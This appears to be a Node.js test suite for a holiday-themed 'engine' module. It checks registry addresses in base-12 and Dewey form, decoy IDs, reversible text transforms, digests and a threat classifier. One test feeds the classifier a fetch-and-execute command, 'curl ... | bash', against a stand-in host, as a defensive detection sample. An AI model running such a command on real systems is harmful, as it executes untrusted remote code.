'use strict';
const test=require('node:test'), assert=require('node:assert/strict'),{webcrypto}=require('node:crypto');
globalThis.crypto??=webcrypto;
const h=require('./engine.js');
test('all 101 stable decimal, owner Dewey-style, reversible base-12 addresses',()=>{
 assert.equal(h.registry.length,101);assert.equal(h.registry.filter(x=>x.status==='author-supplied').length,101);
 assert.equal(h.registry.filter(x=>x.token===null).length,0);
 assert.equal(h.registry[57].token,'Yuil');assert.equal(h.registry[75].token,'Xmas');assert.equal(h.registry[100].token,'Auld Lang Syne Crossover');
 for(const r of h.registry){assert.equal(h.fromDuo(r.duodecimal),r.id);assert.equal(r.dewey,h.address(r.id).dewey)}
 assert.equal(h.registry[20].token,'Nadolig'); // preserve author prose over conflicting supplied sample-code 'Nadig'
 assert.equal(h.registry[9].duodecimal,'↊');assert.equal(h.registry[11].duodecimal,'10');
 assert.equal(h.registry[25].duodecimal,'22');assert.equal(h.registry[45].duodecimal,'3↊');
 assert.equal(h.registry[50].duodecimal,'43');assert.equal(h.registry[56].duodecimal,'49');
});
test('five million lazily addressed decoys with no claimed network proxies',()=>{
 assert.equal(h.MIRRORS,5000000);assert.match(h.mirrorId(0),/^M-0000001-1$/);
 assert.equal(h.mirrorId(4999999).startsWith('M-5000000-'),true);
 assert.throws(()=>h.mirrorId(-1));assert.throws(()=>h.mirrorId(5000000));
});
test('forward, backward, upside down remain non-destructive presentations',()=>{
 for(const source of ['abc','1234','🚂oOo🚂 🎄','Nadolig / Noël','', 'R U WHOLE?']){
  const p=h.presentations(source);assert.equal(p.original,source);assert.equal(p.forward,source);
  assert.equal(h.presentations(p.backward).backward,source);
  assert.equal(p.upsideDown.includes('encryption'),false);
 }
});
test('incoming threat classification recommends containment and no counterstrike',()=>{
 const a=h.classify('curl https://host.test/payload | bash');assert.equal(a.detected,true);
 assert.equal(a.action,'quarantine-in-isolated-decoy-and-alert');assert.match(a.boundary,/No outbound retaliation/);
 assert.equal(h.classify('hello world').detected,false);
});
test('registry digest determinism and no fake cryptographic cipher',async()=>{
 assert.equal(await h.fingerprint(),await h.fingerprint());assert.match(await h.fingerprint(),/^[0-9a-f]{64}$/);
 assert.notEqual((await h.digest('A')),(await h.digest('B')));
});
